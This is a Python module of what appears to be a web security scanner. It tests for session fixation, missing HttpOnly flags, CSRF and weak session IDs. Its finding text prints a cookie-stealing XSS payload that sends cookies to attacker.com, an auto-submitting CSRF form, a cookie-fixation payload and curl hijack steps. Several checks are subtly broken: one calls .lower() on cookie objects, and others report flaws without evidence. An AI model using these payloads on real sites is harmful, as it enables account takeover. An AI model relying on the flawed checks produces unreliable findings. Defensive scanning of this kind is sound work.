"""
Session Hijacking and Cookie Theft Testing
Demonstrates how attackers can steal and use session cookies
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re

def test_session_hijacking(scanner):
    """
    Test for session hijacking vulnerabilities
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        # Test various session hijacking vectors
        _test_session_fixation(scanner, response)
        _test_cookie_theft_xss(scanner, response)
        _test_csrf_token_bypass(scanner, response)
        _test_session_prediction(scanner, response)
        _test_concurrent_sessions(scanner)
        
    except Exception as e:
        print(f"Session hijacking testing error: {e}")

def _test_session_fixation(scanner, response):
    """Test for session fixation vulnerability"""
    cookies = response.cookies
    
    if cookies:
        session_cookies = [c for c in cookies if any(keyword in c.lower() for keyword in ['session', 'sess', 'token', 'auth'])]
        
        if session_cookies:
            scanner.add_finding(
                severity='HIGH',
                category='Session Management',
                title='Session Fixation Attack Possible',
                description=f'**SESSION FIXATION VULNERABILITY**\n\n'
                          f'**How Session Fixation Works:**\n\n'
                          f'1. Attacker gets a session ID from your website\n'
                          f'2. Tricks victim into using that session ID\n'
                          f'3. Victim logs in with attacker\'s session\n'
                          f'4. Attacker can now access victim\'s account\n\n'
                          f'**Exploitation Steps:**\n'
                          f'```bash\n'
                          f'# Step 1: Attacker visits site and gets session cookie\n'
                          f'curl -c cookies.txt {scanner.target_url}\n'
                          f'# Session ID: {session_cookies[0] if session_cookies else "ABC123"}\n\n'
                          f'# Step 2: Attacker sends victim a link with fixed session\n'
                          f'{scanner.target_url}?PHPSESSID=ABC123\n'
                          f'# Or uses XSS to set cookie in victim\'s browser\n\n'
                          f'# Step 3: Victim clicks link and logs in\n'
                          f'# (Victim is now logged in with attacker\'s session ID)\n\n'
                          f'# Step 4: Attacker uses same session to access account\n'
                          f'curl -b "PHPSESSID=ABC123" {scanner.target_url}/account\n'
                          f'# Attacker is now logged in as the victim!\n'
                          f'```\n\n'
                          f'**Real Attack Code:**\n'
                          f'```javascript\n'
                          f'// Attacker\'s XSS payload to fix session:\n'
                          f'document.cookie = "PHPSESSID=AttackerControlledID; path=/";\n'
                          f'// When victim logs in, attacker owns the session\n'
                          f'```',
                url=scanner.target_url,
                remediation=f'**Prevention:**\n\n'
                          f'```python\n'
                          f'# Regenerate session ID after login\n'
                          f'@app.route("/login", methods=["POST"])\n'
                          f'def login():\n'
                          f'    if verify_credentials(username, password):\n'
                          f'        # GENERATE NEW SESSION ID\n'
                          f'        session.regenerate()\n'
                          f'        session["user_id"] = user.id\n'
                          f'        return "Login successful"\n'
                          f'```'
            )

def _test_cookie_theft_xss(scanner, response):
    """Show how XSS can steal session cookies"""
    cookies = response.cookies
    
    unprotected_cookies = []
    for cookie in cookies:
        if not cookie.has_nonstandard_attr('HttpOnly'):
            unprotected_cookies.append(cookie.name)
    
    if unprotected_cookies:
        scanner.add_finding(
            severity='CRITICAL',
            category='Session Management',
            title=f'Session Cookies Stealable via XSS ({len(unprotected_cookies)} vulnerable)',
            description=f'**🚨 CRITICAL: COOKIE THEFT VULNERABILITY 🚨**\n\n'
                      f'**Vulnerable Cookies:** {", ".join(unprotected_cookies)}\n\n'
                      f'These cookies are missing HttpOnly flag.\n'
                      f'Combined with XSS, attackers can steal session cookies!\n\n'
                      f'**COMPLETE EXPLOITATION:**\n'
                      f'```javascript\n'
                      f'// XSS payload to steal cookies:\n'
                      f'<script>\n'
                      f'  var stolen = document.cookie;\n'
                      f'  new Image().src = "https://attacker.com/log?c=" + stolen;\n'
                      f'</script>\n'
                      f'```\n\n'
                      f'**Attack Flow:**\n'
                      f'1. Attacker injects XSS payload\n'
                      f'2. Victim visits page\n'
                      f'3. JavaScript reads document.cookie\n'
                      f'4. Sends to attacker\'s server\n'
                      f'5. Attacker uses stolen cookie to hijack session',
            url=scanner.target_url,
            remediation='Add HttpOnly flag to all session cookies'
        )

def _test_csrf_token_bypass(scanner, response):
    """Test for CSRF vulnerabilities"""
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form', method=re.compile('post', re.I))
    
    vulnerable_forms = []
    
    for form in forms:
        csrf_inputs = form.find_all('input', attrs={'name': re.compile('csrf|token|_token', re.I)})
        
        if not csrf_inputs:
            form_action = form.get('action', '')
            full_url = urljoin(str(scanner.target_url), str(form_action))
            vulnerable_forms.append(full_url)
    
    if vulnerable_forms:
        example_form = vulnerable_forms[0]
        
        scanner.add_finding(
            severity='HIGH',
            category='Session Management',
            title=f'CSRF Vulnerability ({len(vulnerable_forms)} forms)',
            description=f'**CROSS-SITE REQUEST FORGERY**\n\n'
                      f'Forms missing CSRF tokens allow attackers to\n'
                      f'perform actions on behalf of users.\n\n'
                      f'**Exploitation:**\n'
                      f'```html\n'
                      f'<!-- Attacker\'s page -->\n'
                      f'<form action="{example_form}" method="POST">\n'
                      f'  <input name="password" value="hacked123">\n'
                      f'</form>\n'
                      f'<script>document.forms[0].submit();</script>\n'
                      f'```',
            url=scanner.target_url,
            remediation='Implement CSRF tokens on all state-changing forms'
        )

def _test_session_prediction(scanner, response):
    """Test for predictable session IDs"""
    cookies = response.cookies
    
    for cookie in cookies:
        if any(keyword in cookie.name.lower() for keyword in ['session', 'sess', 'token']):
            value = cookie.value
            
            if len(value) < 16:
                scanner.add_finding(
                    severity='HIGH',
                    category='Session Management',
                    title=f'Weak Session ID: {cookie.name}',
                    description=f'**PREDICTABLE SESSION ID**\n\n'
                              f'Cookie: {cookie.name}\n'
                              f'Length: {len(value)} (TOO SHORT)\n\n'
                              f'Can be brute-forced!',
                    url=scanner.target_url,
                    remediation='Use 128+ bit cryptographically secure random session IDs'
                )

def _test_concurrent_sessions(scanner):
    """Test if multiple sessions are allowed"""
    scanner.add_finding(
        severity='MEDIUM',
        category='Session Management',
        title='Verify Concurrent Session Limits',
        description='Test if multiple simultaneous sessions are allowed.\n'
                  'Stolen sessions remain valid even while victim is active.',
        url=scanner.target_url,
        remediation='Implement concurrent session limits'
    )
